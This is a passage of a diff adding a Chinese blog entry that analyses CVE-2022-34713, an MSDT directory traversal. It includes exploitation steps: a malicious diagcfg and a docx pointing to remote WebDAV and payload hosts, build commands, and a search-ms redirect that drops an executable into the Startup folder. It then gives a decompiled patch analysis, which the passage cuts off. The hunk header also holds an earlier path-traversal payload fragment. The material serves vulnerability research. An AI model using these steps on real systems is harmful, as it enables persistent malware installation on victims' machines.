@@ -1696,6 +1696,449 @@ IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(\\\\localhost\\c$\\windows
       </tags>
   </entry>
   <entry>
+    <title>CVE-2022-34713 MSDT目录遍历漏洞分析</title>
+    <url>/2023/05/15/CVE-2022-34713%20MSDT%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>CVE-2022-34713是Microsoft Windows支持诊断工具（MSDT）RCE漏洞。存在路径穿越的脆弱性，攻击者可以遍历目录，将恶意可执行程序放置Window启动文件夹。<br>影响版本：</p>
+<pre class="line-numbers language-none"><code class="language-none">Windows 11
+Server 2022
+Server, version 20H2
+Server 2019
+Windows 10
+Server 2016
+Server 2012 R2
+Server 2012
+Windows 8.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>CVE-2022-34713是Microsoft Windows支持诊断工具（MSDT）RCE漏洞，位于%WINDIR%\System32\msdt.exe,与以下文件类型相关联</p>
+<table>
+<thead>
+<tr>
+<th><strong>File type</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>.diagcab</td>
+<td>Diagnostic cabinet file</td>
+</tr>
+<tr>
+<td>.diagpkg</td>
+<td>Diagnostic package file</td>
+</tr>
+<tr>
+<td>.diagcfg</td>
+<td>Diagnostic configuration file</td>
+</tr>
+</tbody></table>
+<p>关注其中的diagcab文件。解开后拿到Custom.diagcfg:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;PackageConfiguration xmlns="http://www.microsoft.com/schemas/dcm/configuration/2008"&gt;
+  &lt;Execution&gt;
+    &lt;Package Path="\\webdav-test.herokuapp.com@ssl\DavWWWRoot\package" /&gt;
+    &lt;Name&gt;Some name&lt;/Name&gt;
+    &lt;Description&gt;Some description&lt;/Description&gt;
+    &lt;Icon&gt;@%windir%\diagnostics\system\WindowsUpdate\DiagPackage.dll,-1001&lt;/Icon&gt;
+  &lt;/Execution&gt;
+
+  &lt;Index&gt;
+    &lt;Id&gt;Custom&lt;/Id&gt;
+    &lt;RequiresAdminPrivileges&gt;false&lt;/RequiresAdminPrivileges&gt;
+    &lt;PrivacyUrl&gt;http://go.microsoft.com/fwlink/?LinkId=190175&lt;/PrivacyUrl&gt;
+    &lt;Version&gt;1.0&lt;/Version&gt;
+    &lt;PublisherName&gt;Microsoft Corporation&lt;/PublisherName&gt;
+    &lt;Category&gt;@%windir%\system32\DiagCpl.dll,-412&lt;/Category&gt;
+    &lt;Keyword&gt;@%windir%\system32\DiagCpl.dll,-27&lt;/Keyword&gt;
+  &lt;/Index&gt;
+&lt;/PackageConfiguration&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>&lt;Execution&gt;</code>标签下说明了该诊断包的执行行为, msdt会访问<code>&lt;Package Path&gt;</code>给出的路径。</p>
+<p>漏洞位于<code>sdiageng.dll</code>中，该库从diagcab的XML文件中获取攻击者提供的文件夹路径，当包获取完成后, msdt将对其进行签名检查, 它将包的副本复制到<code>%TEMP%\SDIAG_&lt;UUID&gt;</code>的临时目录, 调用函数<code>sdiageng!SdpCopyDirectory</code>。在此过程中枚举攻击者文件夹中的文件，获取每个文件的文件名，然后将本地临时文件路径和该文件名拼接用来创建文件在计算机上的本地路径。</p>
+<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><p>设置一个托管恶意.diagcab文件的webdav服务器，当访问.diagcab文件的链接或者下载时，会将执行路径穿越，把可执行程序写入C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup,每次启动自动执行。</p>
+<h4 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h4><p>1、创建webdav服务器</p>
+<p>实现运行webdav服务的脚本或程序, 部署在服务端。注册并部署客户端访问的package路径。</p>
+<p>2、构造<code>diagcfg</code>文件</p>
+<p>测试用的<code>diagcfg</code>中的package:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;Package Path="\\127.0.0.1\DavWWWRoot\package" /&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>3、构造辅助利用文件: <code>diagcab</code>或<code>docx</code>文档</p>
+<p>4、投递用户, 打开构造后的文件</p>
+<p> 注: 目标环境需要开启webclient服务, 否则无法访问webdav的UNC路径。</p>
+<h4 id="利用的文件类型-diagcab"><a href="#利用的文件类型-diagcab" class="headerlink" title="利用的文件类型: diagcab"></a>利用的文件类型: <code>diagcab</code></h4><p>将<code>diagcfg</code>打包为<code>diagcab</code>, 双击打开后漏洞利用完成:</p>
+<p><img src="/2023/05/15/CVE-2022-34713%20MSDT%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220815155250555.png"></p>
+<p>该漏洞只能做到载荷投放, 需要通过其他方式才可运行。</p>
+<p>使用docker</p>
+<p>1.构建Custom.diagcfg</p>
+<pre class="line-numbers language-none"><code class="language-none">./build-malicious-diagcfg.sh --url [WEBDAV_URL]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>2.构建hotfix895214.diagcab,移至./webdav/diagcab-webdav-poc/config目录,将可执行文件放入./webdav/malicious</p>
+<pre class="line-numbers language-none"><code class="language-none">cabarc.exe n hotfix895214.diagcab Custom.diagcfg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>3.启动服务</p>
+<pre class="line-numbers language-none"><code class="language-none">cd ./webdav/diagcab-webdav-poc
+perl diagcab-webdav-poc.pl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>或者直接使用docker直接执行<code>./hurry-dogwalk.sh [WEBDAV_URL]</code></p>
+<p><img src="/2023/05/15/CVE-2022-34713%20MSDT%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220815155349317.png"></p>
+<h4 id="利用的文件类型-docx"><a href="#利用的文件类型-docx" class="headerlink" title="利用的文件类型: docx"></a>利用的文件类型: docx</h4><p>解开.docx样本文件，关注其中/word/_rels目录下的document.xml.rels文件。会对外部文件进行引用执行。</p>
+<pre class="line-numbers language-none"><code class="language-none">Target="https://irsl.github.io/microsoft-diagcab-rce-poc/payload.html!x-usc:https://irsl.github.io/microsoft-diagcab-rce-poc/payload.html" TargetMode = "External"/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>payload.html</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
+<span class="token operator">...</span>
+window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"search-ms:query=i-repair-everything-on-your-computer.diagcab&amp;crumb=location:%5C%5Cwebdav-test.herokuapp.com%40SSL%5CDavWWWRoot%5Cconfig&amp;displayname=Important%20update"</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>执行payload访问webdav</p>
+<h2 id="0x03-补丁分析"><a href="#0x03-补丁分析" class="headerlink" title="0x03 补丁分析"></a>0x03 补丁分析</h2><h3 id="sdiageng-SdpCopyDirectory"><a href="#sdiageng-SdpCopyDirectory" class="headerlink" title="sdiageng!SdpCopyDirectory"></a>sdiageng!SdpCopyDirectory</h3><p>位于<code>sdiageng!SdpCopyDirectory</code> (19044.1899):</p>
+<p><img src="/2023/05/15/CVE-2022-34713%20MSDT%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220815155426628.png"></p>
+<p>添加了检查目录的逻辑。</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">SdpCopyDirectory</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>aPckSource<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>aTmpSDiagPath<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">const</span> <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>lsTmpSDiagPath<span class="token punctuation">;</span> <span class="token comment">// r13</span>
+  <span class="token keyword">const</span> <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>lPckSource<span class="token punctuation">;</span> <span class="token comment">// r12</span>
+  <span class="token keyword">char</span> bFlagTurnOffCheck<span class="token punctuation">;</span> <span class="token comment">// di</span>
+  LSTATUS lRes1<span class="token punctuation">;</span> <span class="token comment">// eax</span>
+  __int64 v6<span class="token punctuation">;</span> <span class="token comment">// r8</span>
+  <span class="token keyword">unsigned</span> __int64 lRes2<span class="token punctuation">;</span> <span class="token comment">// r9</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>hFind<span class="token punctuation">;</span> <span class="token comment">// r15</span>
+  __int64 itraceCode1<span class="token punctuation">;</span> <span class="token comment">// r8</span>
+  <span class="token keyword">int</span> dwLastError5<span class="token punctuation">;</span> <span class="token comment">// er9</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> dwLastError2<span class="token punctuation">;</span> <span class="token comment">// ebx</span>
+  LSTATUS dwRet1<span class="token punctuation">;</span> <span class="token comment">// eax</span>
+  __int64 v13<span class="token punctuation">;</span> <span class="token comment">// r8</span>
+  <span class="token keyword">signed</span> <span class="token keyword">int</span> dwRet2<span class="token punctuation">;</span> <span class="token comment">// ebx</span>
+  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sWebDavFile<span class="token punctuation">;</span> <span class="token comment">// rsi</span>
+  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sTmpSDiagFile<span class="token punctuation">;</span> <span class="token comment">// r14</span>
+  <span class="token keyword">int</span> dwLastError3<span class="token punctuation">;</span> <span class="token comment">// er9</span>
+  __int64 itraceCode2<span class="token punctuation">;</span> <span class="token comment">// r8</span>
+  <span class="token keyword">signed</span> <span class="token keyword">int</span> dwLastError4<span class="token punctuation">;</span> <span class="token comment">// eax</span>
+  <span class="token keyword">signed</span> <span class="token keyword">int</span> dwLastError6<span class="token punctuation">;</span> <span class="token comment">// eax</span>
+  __int64 v21<span class="token punctuation">;</span> <span class="token comment">// r8</span>
+  <span class="token keyword">signed</span> <span class="token keyword">int</span> dwLastError1<span class="token punctuation">;</span> <span class="token comment">// eax</span>
+  BYTE Data<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-D0h]</span>
+  DWORD cbData<span class="token punctuation">;</span> <span class="token comment">// [rsp+34h] [rbp-CCh]</span>
+  DWORD Type<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-C8h]</span>
+  HKEY hKey<span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-C0h]</span>
+  <span class="token keyword">struct</span> <span class="token class-name">_WIN32_FIND_DATAW</span> FindFileData<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-B0h]</span>
+  wil<span class="token operator">::</span>details<span class="token operator">::</span>in1diag3 <span class="token operator">*</span>retaddr<span class="token punctuation">;</span> <span class="token comment">// [rsp+2E8h] [rbp+1E8h]</span>
+
+  lsTmpSDiagPath <span class="token operator">=</span> aTmpSDiagPath<span class="token punctuation">;</span>
+  lPckSource <span class="token operator">=</span> aPckSource<span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> byte_7FFC50EF27F8 <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    bFlagTurnOffCheck <span class="token operator">=</span> byte_7FFC50EF2858<span class="token punctuation">;</span>
+    <span class="token keyword">goto</span> DEBUG_TRACE1<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  hKey <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>                                  <span class="token comment">// TurnOffCheck Registry key turned on</span>
+  lRes1 <span class="token operator">=</span> <span class="token function">RegOpenKeyExW</span><span class="token punctuation">(</span>
+            HKEY_LOCAL_MACHINE<span class="token punctuation">,</span>
+            L<span class="token string">"Software\\Policies\\Microsoft\\Windows\\ScriptedDiagnostics"</span><span class="token punctuation">,</span>
+            <span class="token number">0</span><span class="token punctuation">,</span>
+            <span class="token number">0x20019u</span><span class="token punctuation">,</span>
+            <span class="token operator">&amp;</span>hKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  lRes2 <span class="token operator">=</span> lRes1 <span class="token operator">|</span> <span class="token number">0x80070000</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> lRes1 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
+    lRes2 <span class="token operator">=</span> lRes1<span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>lRes2 <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span>i64 <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    wil<span class="token operator">::</span>details<span class="token operator">::</span>in1diag3<span class="token operator">::</span><span class="token function">_Log_Hr</span><span class="token punctuation">(</span>retaddr<span class="token punctuation">,</span> <span class="token number">0x7EA</span><span class="token punctuation">,</span> v6<span class="token punctuation">,</span> lRes2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+TURNOFFCHECK_OFF<span class="token operator">:</span>
+    bFlagTurnOffCheck <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token keyword">goto</span> DEBUG_TRACE1<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>hKey <span class="token punctuation">)</span>
+    <span class="token keyword">goto</span> TURNOFFCHECK_OFF<span class="token punctuation">;</span>
+  <span class="token operator">*</span>Data <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  Type <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
+  cbData <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
+  dwRet1 <span class="token operator">=</span> <span class="token function">RegQueryValueExW</span><span class="token punctuation">(</span>hKey<span class="token punctuation">,</span> L<span class="token string">"TurnOffCheck"</span><span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Type<span class="token punctuation">,</span> Data<span class="token punctuation">,</span> <span class="token operator">&amp;</span>cbData<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  dwRet2 <span class="token operator">=</span> dwRet1 <span class="token operator">|</span> <span class="token number">0x80070000</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> dwRet1 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
+    dwRet2 <span class="token operator">=</span> dwRet1<span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> dwRet2 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
+    wil<span class="token operator">::</span>details<span class="token operator">::</span>in1diag3<span class="token operator">::</span><span class="token function">_Log_Hr</span><span class="token punctuation">(</span>retaddr<span class="token punctuation">,</span> <span class="token number">0x7FB</span><span class="token punctuation">,</span> v13<span class="token punctuation">,</span> dwRet2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> hKey <span class="token punctuation">)</span>
+    <span class="token function">RegCloseKey</span><span class="token punctuation">(</span>hKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> dwRet2 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>bFlagTurnOffCheck <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token operator">*</span>Data<span class="token punctuation">)</span> <span class="token punctuation">)</span>
+    bFlagTurnOffCheck <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+  byte_7FFC50EF2858 <span class="token operator">=</span> bFlagTurnOffCheck<span class="token punctuation">;</span>
+  byte_7FFC50EF27F8 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+DEBUG_TRACE1<span class="token operator">:</span>
+  hFind <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>lPckSource <span class="token punctuation">)</span>                            <span class="token comment">// Check arguments for errors</span>
+  <span class="token punctuation">{</span>
+    itraceCode1 <span class="token operator">=</span> <span class="token number">2103</span>i64<span class="token punctuation">;</span>
+DEBUG_TRACE2<span class="token operator">:</span>
+    dwLastError5 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147024809</span><span class="token punctuation">;</span>
+DEBUG_TRACE3<span class="token operator">:</span>
+    dwLastError2 <span class="token operator">=</span> dwLastError5<span class="token punctuation">;</span>
+    <span class="token function">SdpDebugTrace</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">,</span> L<span class="token string">"SdpCopyDirectory"</span><span class="token punctuation">,</span> itraceCode1<span class="token punctuation">,</span> dwLastError5<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> dwLastError2<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>lsTmpSDiagPath <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    itraceCode1 <span class="token operator">=</span> <span class="token number">2104</span>i64<span class="token punctuation">;</span>
+    <span class="token keyword">goto</span> DEBUG_TRACE2<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  sWebDavFile <span class="token operator">=</span> operator new<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x208u</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>sWebDavFile <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    dwLastError5 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147024882</span><span class="token punctuation">;</span>
+    itraceCode1 <span class="token operator">=</span> <span class="token number">2107</span>i64<span class="token punctuation">;</span>
+    <span class="token keyword">goto</span> DEBUG_TRACE3<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  sTmpSDiagFile <span class="token operator">=</span> operator new<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x208u</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>sTmpSDiagFile <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    dwLastError3 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147024882</span><span class="token punctuation">;</span>
+    itraceCode2 <span class="token operator">=</span> <span class="token number">2110</span>i64<span class="token punctuation">;</span>
+    dwLastError2 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147024882</span><span class="token punctuation">;</span>
+    <span class="token keyword">goto</span> DEBUG_TRACE5<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  dwLastError4 <span class="token operator">=</span> <span class="token function">StringCchPrintfW</span><span class="token punctuation">(</span>sWebDavFile<span class="token punctuation">,</span> <span class="token number">260</span>i64<span class="token punctuation">,</span> L<span class="token string">"%s\\*"</span><span class="token punctuation">,</span> lPckSource<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  dwLastError2 <span class="token operator">=</span> dwLastError4<span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError4 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    itraceCode2 <span class="token operator">=</span> <span class="token number">2113</span>i64<span class="token punctuation">;</span>
+    <span class="token keyword">goto</span> DEBUG_TRACE4<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  hFind <span class="token operator">=</span> <span class="token function">FindFirstFileW</span><span class="token punctuation">(</span>sWebDavFile<span class="token punctuation">,</span> <span class="token operator">&amp;</span>FindFileData<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Search for file or directory in WebDavRoot\*</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>hFind <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0xFFFFFFFFFFFFFFFDu</span>i64 <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    <span class="token keyword">do</span>
+    <span class="token punctuation">{</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span>FindFileData<span class="token punctuation">.</span>dwFileAttributes <span class="token operator">&amp;</span> FILE_ATTRIBUTE_DIRECTORY<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// Isn't it a directory? Setup sWebDavFile and sTmpSDiagFile</span>
+      <span class="token punctuation">{</span>
+        dwLastError4 <span class="token operator">=</span> <span class="token function">StringCchPrintfW</span><span class="token punctuation">(</span>sWebDavFile<span class="token punctuation">,</span> <span class="token number">260</span>i64<span class="token punctuation">,</span> L<span class="token string">"%s\\%s"</span><span class="token punctuation">,</span> lPckSource<span class="token punctuation">,</span> FindFileData<span class="token punctuation">.</span>cFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        dwLastError2 <span class="token operator">=</span> dwLastError4<span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError4 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+          itraceCode2 <span class="token operator">=</span> <span class="token number">2134</span>i64<span class="token punctuation">;</span>
+DEBUG_TRACE4<span class="token operator">:</span>
+          dwLastError3 <span class="token operator">=</span> dwLastError4<span class="token punctuation">;</span>
+DEBUG_TRACE5<span class="token operator">:</span>
+          <span class="token function">SdpDebugTrace</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">,</span> L<span class="token string">"SdpCopyDirectory"</span><span class="token punctuation">,</span> itraceCode2<span class="token punctuation">,</span> dwLastError3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        dwLastError4 <span class="token operator">=</span> <span class="token function">StringCchPrintfW</span><span class="token punctuation">(</span>sTmpSDiagFile<span class="token punctuation">,</span> <span class="token number">260</span>i64<span class="token punctuation">,</span> L<span class="token string">"%s\\%s"</span><span class="token punctuation">,</span> lsTmpSDiagPath<span class="token punctuation">,</span> FindFileData<span class="token punctuation">.</span>cFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        dwLastError2 <span class="token operator">=</span> dwLastError4<span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError4 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+          itraceCode2 <span class="token operator">=</span> <span class="token number">0x85D</span>i64<span class="token punctuation">;</span>
+          <span class="token keyword">goto</span> DEBUG_TRACE4<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> bFlagTurnOffCheck <span class="token punctuation">)</span>                <span class="token comment">// Is TurnOffCheck turned off?</span>
+        <span class="token punctuation">{</span>
+          <span class="token operator">*</span>Data <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+          dwLastError6 <span class="token operator">=</span> <span class="token function">SdpIsSubDirectory</span><span class="token punctuation">(</span>lPckSource<span class="token punctuation">,</span> sWebDavFile<span class="token punctuation">,</span> Data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Check if any WebDav file is sub-directory of package source </span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError6 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
+            <span class="token keyword">goto</span> REPORT_FAILURE<span class="token punctuation">;</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span>Data <span class="token punctuation">)</span>
+            <span class="token keyword">continue</span><span class="token punctuation">;</span>
+          <span class="token operator">*</span>Data <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+          dwLastError6 <span class="token operator">=</span> <span class="token function">SdpIsSubDirectory</span><span class="token punctuation">(</span>lsTmpSDiagPath<span class="token punctuation">,</span> sTmpSDiagFile<span class="token punctuation">,</span> Data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Check if any file at %TMP\SDIAG_random-clsid is sub-directory of folder %TMP%\SDIAG_random-clsid</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError6 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
+          <span class="token punctuation">{</span>
+REPORT_FAILURE<span class="token operator">:</span>
+            wil<span class="token operator">::</span>details<span class="token operator">::</span>in1diag3<span class="token operator">::</span><span class="token function">_Log_Hr</span><span class="token punctuation">(</span>retaddr<span class="token punctuation">,</span> <span class="token number">0x80D</span><span class="token punctuation">,</span> v21<span class="token punctuation">,</span> dwLastError6<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">continue</span><span class="token punctuation">;</span>
+          <span class="token punctuation">}</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span>Data <span class="token punctuation">)</span>                         <span class="token comment">// Result is stored at "Data": *Data=0x1 =&gt; CopyFile, if not: continue. </span>
+                                                <span class="token comment">// So this is actually the ##DogWalk vuln check.</span>
+            <span class="token keyword">continue</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">CopyFileW</span><span class="token punctuation">(</span>sWebDavFile<span class="token punctuation">,</span> sTmpSDiagFile<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// Vulnerable CopyFile op</span>
+        <span class="token punctuation">{</span>
+          dwLastError2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">else</span>
+        <span class="token punctuation">{</span>
+          dwLastError1 <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          dwLastError2 <span class="token operator">=</span> dwLastError1 <span class="token operator">|</span> <span class="token number">0x80070000</span><span class="token punctuation">;</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError1 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
+            dwLastError2 <span class="token operator">=</span> dwLastError1<span class="token punctuation">;</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>dwLastError2 <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
+          <span class="token punctuation">{</span>
+            dwLastError3 <span class="token operator">=</span> dwLastError2<span class="token punctuation">;</span>
+            itraceCode2 <span class="token operator">=</span> <span class="token number">2151</span>i64<span class="token punctuation">;</span>
+            <span class="token keyword">goto</span> DEBUG_TRACE5<span class="token punctuation">;</span>
